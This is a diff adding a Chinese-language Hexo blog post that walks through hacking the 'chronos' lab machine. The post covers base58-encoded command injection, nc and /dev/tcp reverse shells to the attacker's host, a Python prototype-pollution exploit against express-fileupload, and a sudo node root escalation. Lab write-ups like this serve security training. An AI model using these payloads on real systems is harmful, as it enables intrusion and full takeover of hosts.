@@ -1,0 +1,435 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>44.靶机chronos | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="靶机chronos 信息收集 进行主机的发现，由于已知主机跟Kali在同一网段下 ,所以使用 arp-scan 工具扫描ip 1arp-scan -l -I eth0   使用nmap进行端口扫描，第一步是对目标进行端口的发现 1nmap -p- 192.168.56.101  发现靶机上开了3个端口  识别靶机端口开放的服务 1nmap -p22,8000,80 -sV 192.168.56.1">
+<meta property="og:type" content="article">
+<meta property="og:title" content="44.靶机chronos">
+<meta property="og:url" content="http://example.com/2024/02/27/%E9%9D%B6%E6%9C%BA/44-%E9%9D%B6%E6%9C%BAchronos.assets/44-%E9%9D%B6%E6%9C%BAchronos/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="靶机chronos 信息收集 进行主机的发现，由于已知主机跟Kali在同一网段下 ,所以使用 arp-scan 工具扫描ip 1arp-scan -l -I eth0   使用nmap进行端口扫描，第一步是对目标进行端口的发现 1nmap -p- 192.168.56.101  发现靶机上开了3个端口  识别靶机端口开放的服务 1nmap -p22,8000,80 -sV 192.168.56.1">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/44-%E9%9D%B6%E6%9C%BAchronos.assets/image-20240227204432829.png">
+<meta property="og:image" content="http://example.com/44-%E9%9D%B6%E6%9C%BAchronos.assets/image-20240227204632520.png">
+<meta property="og:image" content="http://example.com/44-%E9%9D%B6%E6%9C%BAchronos.assets/image-20240227204726647.png">
+<meta property="og:image" content="http://example.com/44-%E9%9D%B6%E6%9C%BAchronos.assets/image-20240227204836245.png">
+<meta property="og:image" content="http://example.com/44-%E9%9D%B6%E6%9C%BAchronos.assets/image-20240227205007063.png">
+<meta property="og:image" content="http://example.com/44-%E9%9D%B6%E6%9C%BAchronos.assets/image-20240227205306561.png">
+<meta property="og:image" content="http://example.com/44-%E9%9D%B6%E6%9C%BAchronos.assets/image-20240227205540583.png">
+<meta property="og:image" content="http://example.com/44-%E9%9D%B6%E6%9C%BAchronos.assets/image-20240227211758273.png">
+<meta property="og:image" content="http://example.com/44-%E9%9D%B6%E6%9C%BAchronos.assets/image-20240227212143452.png">
+<meta property="og:image" content="http://example.com/44-%E9%9D%B6%E6%9C%BAchronos.assets/image-20240227212243578.png">
+<meta property="og:image" content="http://example.com/44-%E9%9D%B6%E6%9C%BAchronos.assets/image-20240227212835573.png">
+<meta property="og:image" content="http://example.com/44-%E9%9D%B6%E6%9C%BAchronos.assets/image-20240227213216647.png">
+<meta property="og:image" content="http://example.com/44-%E9%9D%B6%E6%9C%BAchronos.assets/image-20240227214611219.png">
+<meta property="og:image" content="http://example.com/44-%E9%9D%B6%E6%9C%BAchronos.assets/image-20240227214715730.png">
+<meta property="og:image" content="http://example.com/44-%E9%9D%B6%E6%9C%BAchronos.assets/image-20240227220454069.png">
+<meta property="article:published_time" content="2024-02-27T12:42:55.000Z">
+<meta property="article:modified_time" content="2024-02-29T11:28:32.142Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/44-%E9%9D%B6%E6%9C%BAchronos.assets/image-20240227204432829.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/plugin/bganimation/bg.css">
+
+  
+
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css" rel="stylesheet" type="text/css">
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <div class="outer">
+        <div class="widget-wrap mobile-header">
+  <h3 class="widget-title"></h3>
+  <div class="widget">
+    <img class="avatar" src="https://avatars0.githubusercontent.com/u/20333903?v=3&amp;s=460">
+    <h2 class="author">John Doe</h2>
+    <h3 class="description"></h3>
+    <div class="count-box">
+      <a href="/archives"><div><strong>65</strong><br>文章</div></a>
+      <a href="/categories"><div><strong>0</strong><br>分类</div></a>
+      <a href="/tags"><div><strong>1</strong><br>标签</div></a>
+    </div>
+    <ul class="blog-link">
+     
+          <a href="/" title="Home">
+            <li>主页</li>
+          </a>
+        
+          <a href="/archives" title="Archives">
+            <li>归档</li>
+          </a>
+        
+          <a href="/categories" title="Categories">
+            <li>分类</li>
+          </a>
+        
+          <a href="/tags" title="Tags">
+            <li>标签</li>
+          </a>
+        
+    </ul>
+  </div>
+</div>
+
+        <section id="main"><article id="post-靶机/44-靶机chronos.assets/44-靶机chronos" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2024/02/27/%E9%9D%B6%E6%9C%BA/44-%E9%9D%B6%E6%9C%BAchronos.assets/44-%E9%9D%B6%E6%9C%BAchronos/" class="article-date">
+  <time class="post-time" datetime="2024-02-27T12:42:55.000Z" itemprop="datePublished">
+    <span class="post-month">2月</span><br/>
+    <span class="post-day">27</span>
+  </time>
+</a>
+   
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      44.靶机chronos
+    </h1>
+  
+
+        <div>
+          
+          
+              
+
+          
+        </div>
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>靶机chronos</p>
+<p>信息收集</p>
+<p>进行主机的发现，由于已知主机跟Kali在同一网段下 ,所以使用 arp-scan 工具扫描ip</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l -I eth0</span><br></pre></td></tr></table></figure>
+
+<p><img src="/44-%E9%9D%B6%E6%9C%BAchronos.assets/image-20240227204432829.png" alt="image-20240227204432829"></p>
+<p>使用nmap进行端口扫描，第一步是对目标进行端口的发现</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p- 192.168.56.101</span><br></pre></td></tr></table></figure>
+
+<p>发现靶机上开了3个端口</p>
+<p><img src="/44-%E9%9D%B6%E6%9C%BAchronos.assets/image-20240227204632520.png" alt="image-20240227204632520"></p>
+<p>识别靶机端口开放的服务</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p22,8000,80 -sV 192.168.56.101 </span><br></pre></td></tr></table></figure>
+
+<p><img src="/44-%E9%9D%B6%E6%9C%BAchronos.assets/image-20240227204726647.png" alt="image-20240227204726647"></p>
+<p>访问192.168.56.101 </p>
+<p><img src="/44-%E9%9D%B6%E6%9C%BAchronos.assets/image-20240227204836245.png" alt="image-20240227204836245"></p>
+<p>没有东西</p>
+<p>查看页面源代码</p>
+<p><img src="/44-%E9%9D%B6%E6%9C%BAchronos.assets/image-20240227205007063.png" alt="image-20240227205007063"></p>
+<p>发现一个url</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://chronos.local:8000/date?format=4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL</span><br></pre></td></tr></table></figure>
+
+<p>结合端口扫描获取信息（目标靶机开启8000端口），通过对以上URL的分析，<code>chronos.local</code>很有可能就是目标靶机本身，并通过data?format&#x3D;获取了系列资源</p>
+<p>kali本地hosts绑定chronos.local域名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo vi /etc/hosts</span><br><span class="line">a模式插入</span><br><span class="line">192.168.56.101 chronos.local</span><br></pre></td></tr></table></figure>
+
+<p>再次刷新192.168.56.101 ，页面发生变化</p>
+<p><img src="/44-%E9%9D%B6%E6%9C%BAchronos.assets/image-20240227205306561.png" alt="image-20240227205306561"></p>
+<p>发现时间是变化的</p>
+<p>怀疑是命令执行，对获取系统时间有直接作用</p>
+<p>用Burp记录网站加载过程进行抓包</p>
+<p><img src="/44-%E9%9D%B6%E6%9C%BAchronos.assets/image-20240227205540583.png" alt="image-20240227205540583"></p>
+<p>通过Burp-Repeater测试GET参数</p>
+<p><img src="/44-%E9%9D%B6%E6%9C%BAchronos.assets/image-20240227211758273.png" alt="image-20240227211758273"></p>
+<p>错误信息中显示了是base58编码</p>
+<p>研究下4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL </p>
+<p>使用CyberChef工具由Base58解码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CyberChef工具地址https://icyberchef.com/</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;+Today is %A, %B %d, %Y %H:%M:%S.&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>结合网页收集的信息，该参数和date输出参数很相似</p>
+<p>有理由猜测该Web应用程序执行的是操作系统指令</p>
+<p>尝试注入</p>
+<p>Linux系统命令拼接符号：|、；、&amp;</p>
+<p>A||B表示：A执行失败，执行B</p>
+<p>A&amp;&amp;B表示：A执行成功，执行B</p>
+<p>如果在系统执行命令下后拼接ls命令&amp;&amp;ls，那么系统应该应该列出当前目录中的文件</p>
+<p>base58(&amp;&amp;ls)&#x3D;yZSGA </p>
+<p><img src="/44-%E9%9D%B6%E6%9C%BAchronos.assets/image-20240227212143452.png" alt="image-20240227212143452"></p>
+<p>查询是否存在nc</p>
+<p>base58(&amp;&amp;ls &#x2F;bin)&#x3D;VAZYW9RHPu6D</p>
+<p><img src="/44-%E9%9D%B6%E6%9C%BAchronos.assets/image-20240227212243578.png" alt="image-20240227212243578"></p>
+<p>在右边结果中发现有nc</p>
+<p>测试nc功能是否正常</p>
+<p>base58(&amp;&amp;nc 192.168.56.102 5555)&#x3D;4UiiY6bkrF7pai4b23hZFghvcmyKsBStt</p>
+<p><img src="/44-%E9%9D%B6%E6%9C%BAchronos.assets/image-20240227212835573.png" alt="image-20240227212835573"></p>
+<p>可以建立连接</p>
+<p>使用nc串联方法反弹连接</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">base58(&amp;&amp;nc 192.168.56.102 5555 | /bin/bash | nc 192.168.56.102 6666)=Wqif9Y5HMzQyibWE2TNtxFv2gSUAxAWHVyd7AZxbL2cpEXzRor13WdyY1nfFTeS65EBMdTTrqbfqjcqEhvm</span><br></pre></td></tr></table></figure>
+
+<p>反弹成功</p>
+<p><img src="/44-%E9%9D%B6%E6%9C%BAchronos.assets/image-20240227213216647.png" alt="image-20240227213216647"></p>
+<p>系统信息收集<br>查看系统账号，发现存在imera账户</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwd</span><br><span class="line">id</span><br><span class="line">cat /etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p><img src="/44-%E9%9D%B6%E6%9C%BAchronos.assets/image-20240227214611219.png" alt="image-20240227214611219"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /home/imera</span><br><span class="line">ls -l</span><br></pre></td></tr></table></figure>
+
+<p><img src="/44-%E9%9D%B6%E6%9C%BAchronos.assets/image-20240227214715730.png" alt="image-20240227214715730"></p>
+<p>尝试三种常用的提权方法都无法使用：1、内核漏洞；2、suid提权；3、sudo配置错误</p>
+<p>代码审计</p>
+<ol>
+<li>查看网站根的package.json源码，依赖的组件</li>
+<li>再次查看app.js源码，且有相关命令的检测，但没有过滤，确认存在命令执行漏洞，没有找到更多的提权信息</li>
+<li>返回上级目录发现了chronos-v2目录，进入chronos-v2&#x2F;backend目录，发现package.json和server.js文件</li>
+<li>通过对&#x2F;opt&#x2F;chronos-v2&#x2F;backend&#x2F;server.js文件进行审计，发现靶机在127.0.0.1:8080监听的有一个应用</li>
+<li>通过对&#x2F;opt&#x2F;chronos-v2&#x2F;backend&#x2F;package.json文件进行审计，发现fileupload({ parseNested: true }以及”express-fileupload”: “^1.1.7-alpha.3”</li>
+<li>通过多方搜索，发现靶机express-fileupload版本存在提权漏洞</li>
+</ol>
+<p>进行系统用户提权</p>
+<ul>
+<li>Kali主机创建py脚本vi python</li>
+<li>参照<a target="_blank" rel="noopener" href="https://blog.p6.is/Real-World-JS-1/%E5%86%99%E5%85%A5%E6%94%BB%E5%87%BB%E8%84%9A%E6%9C%AC">https://blog.p6.is/Real-World-JS-1/写入攻击脚本</a></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">cmd = &#x27;bash -c &quot;bash -i &amp;&gt; /dev/tcp/192.168.56.102/7777 0&gt;&amp;1&quot;&#x27;</span><br><span class="line"></span><br><span class="line"># pollute</span><br><span class="line">requests.post(&#x27;http://127.0.0.1:8080&#x27;, files = &#123;&#x27;__proto__.outputFunctionName&#x27;: (</span><br><span class="line">    None, f&quot;x;console.log(1);process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;&#123;cmd&#125;&#x27;);x&quot;)&#125;)</span><br><span class="line"></span><br><span class="line"># execute command</span><br><span class="line">requests.get(&#x27;http://127.0.0.1:8080&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p>启动http server，将<code>exp.py</code>写入靶机</p>
+<p>Kali主机</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure>
+
+<p>靶机</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line">wget -c http://192.168.56.102/exp.py</span><br></pre></td></tr></table></figure>
+
+<p>启动监听端口，执行exp.py反弹Shell</p>
+<p>Kali</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lnvp 7777</span><br></pre></td></tr></table></figure>
+
+<p>靶机</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 exp.py</span><br></pre></td></tr></table></figure>
+
+<p>Shell反弹成功，imera用户</p>
+<p><img src="/44-%E9%9D%B6%E6%9C%BAchronos.assets/image-20240227220454069.png" alt="image-20240227220454069"></p>
+<p>获取用户Flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd ~</span><br><span class="line">cat user.txt</span><br></pre></td></tr></table></figure>
+
+<p>Root用户提权</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
+
+<p>sudo node提权</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo node -e &#x27;child_process.spawn(&quot;/bin/bash&quot;, &#123;stdio:[0,1,2]&#125;)&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>获取root用户Flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /root/root.txt</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2024/02/27/%E9%9D%B6%E6%9C%BA/44-%E9%9D%B6%E6%9C%BAchronos.assets/44-%E9%9D%B6%E6%9C%BAchronos/" data-id="cltmognax00089wu438qyb35c" class="article-share-link">分享</a>
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2024/02/28/%E9%9D%B6%E6%9C%BA/45-%E9%9D%B6%E6%9C%BAAdmX_new/45-%E9%9D%B6%E6%9C%BAAdmX_new/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">上一篇</strong>
+      <div class="article-nav-title">
+        
+          45.靶机AdmX_new
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2024/02/20/CSRF%E5%92%8CSSRF/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">下一篇</strong>
+      <div class="article-nav-title">CSRF和SSRF</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    <div class="widget-wrap">
+  <h3 class="widget-title"></h3>
+  <div class="widget">
+    <h1 class="blog-title">Hexo</h1>
+    <h2 class="blog-subtitle"></h2>
+    <ul class="blog-link">
+     
+          <a href="/" title="Home">
+            <li>主页</li>
+          </a>
+        
+          <a href="/archives" title="Archives">
+            <li>归档</li>
+          </a>
+        
+          <a href="/categories" title="Categories">
+            <li>分类</li>
+          </a>
+        
+          <a href="/tags" title="Tags">
+            <li>标签</li>
+          </a>
+        
+    </ul>
+  </div>
+</div>
+
+  
+    <div class="widget-wrap">
+  <h3 class="widget-title"></h3>
+  <div class="widget">
+    <img class="avatar" src="https://avatars0.githubusercontent.com/u/20333903?v=3&amp;s=460">
+    <h2 class="author">John Doe</h2>
+    <h3 class="description"></h3>
+    <div class="count-box">
+      <a href="/archives"><div><strong>65</strong><br>文章</div></a>
+      <a href="/categories"><div><strong>0</strong><br>分类</div></a>
+      <a href="/tags"><div><strong>1</strong><br>标签</div></a>
+    </div>
+
+
+
+    <div class="social-link">
+      
+        <a class="hvr-bounce-in" href="http://github.com/ShanaMaid" target="_blank" title="Github">
+          Github
+        </a>
+      
+    </div>
+
+    <div class="friend-link">
+      <h2>友情链接</h2>
+      
+        <a class="hvr-bounce-in" href="http://blog.shanamaid.top/" target="_blank" title="ShanaMaid">
+          ShanaMaid
+        </a>
+      
+    </div>
+  </div>
+</div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy;2023 - 2024 John Doe<br>
+      由<a href="http://hexo.io/" target="_blank">Hexo</a>强力驱动 | 
+      主题-<a target="_blank" rel="noopener" href="https://github.com/ShanaMaid/hexo-theme-shana">Shana</a>
+      
+    </div>
+    
+  </div>
+</footer>
+    </div>
+    
+
+<script src="//apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script>
+<script src="//apps.bdimg.com/libs/wow/0.1.6/wow.min.js"></script>
+<script>
+new WOW().init();
+</script>   
+
+
+  
+<link rel="stylesheet" href="/plugin/fancybox/jquery.fancybox.css">
+
+  
+<script src="/plugin/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+  
+<link rel="stylesheet" href="/plugin/galmenu/GalMenu.css">
+
+  
+<script src="/plugin/galmenu/GalMenu.js"></script>
+
+  <div class="GalMenu GalDropDown">
+      <div class="circle" id="gal">
+        <div class="ring">
+          
+            <a href="/" title="" class="menuItem">首页</a>
+          
+            <a href="/tags" title="" class="menuItem">标签</a>
+          
+            <a href="/categories" title="" class="menuItem">分类</a>
+          
+            <a href="/archives" title="" class="menuItem">归档</a>
+          
+            <a href="/xxxxxxxxx" title="" class="menuItem">xxx</a>
+          
+            <a href="/xxxxxxx" title="" class="menuItem">xxxx</a>
+          
+        </div>
+        
+          <audio id="audio" src="#"></audio>
+        
+      </div> 
+</div>
+<div id="overlay" style="opacity: 1; cursor: pointer;"></div>
+  <script type="text/javascript">var items = document.querySelectorAll('.menuItem');
+    for (var i = 0,
+    l = items.length; i < l; i++) {
+      items[i].style.left = (50 - 35 * Math.cos( - 0.5 * Math.PI - 2 * (1 / l) * i * Math.PI)).toFixed(4) + "%";
+      items[i].style.top = (50 + 35 * Math.sin( - 0.5 * Math.PI - 2 * (1 / l) * i * Math.PI)).toFixed(4) + "%"
+    }</script>
+<script type="text/javascript">
+  $(document).ready(function() {
+    $('body').GalMenu({
+      'menu': 'GalDropDown'
+    })
+  });
+</script>
+
+  <section class="hidden-xs"> 
+  <ul class="cb-slideshow"> 
+    <li><span>苟利</span></li> 
+    <li><span>国家</span></li> 
+    <li><span>生死以</span></li> 
+    <li><span>岂能</span></li> 
+    <li><span>祸福</span></li> 
+    <li><span>趋避之</span></li> 
+  </ul>
+</section>
+
+<script src="/js/script.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
